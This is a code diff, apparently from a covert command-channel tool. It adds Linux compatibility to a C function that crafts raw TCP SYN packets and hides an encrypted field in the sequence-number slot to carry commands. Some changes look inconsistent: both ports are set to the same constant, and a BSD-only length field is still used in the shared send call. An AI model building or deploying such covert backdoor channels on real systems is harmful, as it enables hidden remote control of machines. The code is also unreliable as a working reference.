@@ -314,6 +314,7 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     memset(buffer, 0, packetLength);
     
     // IP structure
+#if defined __APPLE__ || defined __USE_BSD
     iph->ip_hl = 5;
     iph->ip_v = 4;
     iph->ip_tos = 16;
@@ -323,11 +324,24 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     iph->ip_ttl = 64;
     iph->ip_p = 6;
     iph->ip_sum = 0;
-    
     iph->ip_src = sin.sin_addr;
     iph->ip_dst = din.sin_addr;
+#else
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 16;
+    iph->tot_len = packetLength;
+    iph->id = htons(54321);
+    iph->frag_off = 0;
+    iph->ttl = 64;
+    iph->protocol = 6;
+    iph->check = 0;
+    iph->saddr = sin.sin_addr;
+    iph->daddr = din.sin_addr;
+#endif
     
     // TCP structure
+#if defined __APPLE__ || defined __FAVOR_BSD
     tcph->th_sport = htons(*info->srcPort);
     tcph->th_dport = htons(*info->destPort);
     memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
@@ -337,6 +351,17 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     tcph->th_win = htons(32767);
     tcph->th_sum = 0;
     tcph->th_urp = 0;
+#else
+    tcph->source = htons(SOURCE_PORT_INT);
+    tcph->dest = htons(SOURCE_PORT_INT);
+    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(unsigned long));
+    tcph->ack_seq = 0;
+    tcph->doff = 5;
+    tcph->syn = 1;
+    tcph->window = htons(32767);
+    tcph->check = 0;
+    tcph->urg_ptr = 0;
+#endif
     
     // Build the command
     commandBuffer[0] = command + 48;
@@ -356,7 +381,11 @@ static void sendCommand(netInfo *info, int command, char *commandData)
            strnlen(commandBuffer, PATH_MAX) + 1);
     
     // IP checksum calculation
+#if defined __APPLE__ || defined __USE_BSD
     iph->ip_sum = csum((unsigned short *)buffer, 5);
+#else
+    iph->check = csum((unsigned short *)buffer, 5);
+#endif
     
     // Create the socket for sending the packets
     sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -372,7 +401,7 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     }
     
     // Send the packet out
-    if (sendto(sock, buffer, iph->ip_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0)
+    if (sendto(sock, buffer, iph->ip_len, 0, (struct sockaddr *) &din, sizeof(din)) < 0)
     {
         systemFatal("sendto failed");
     }
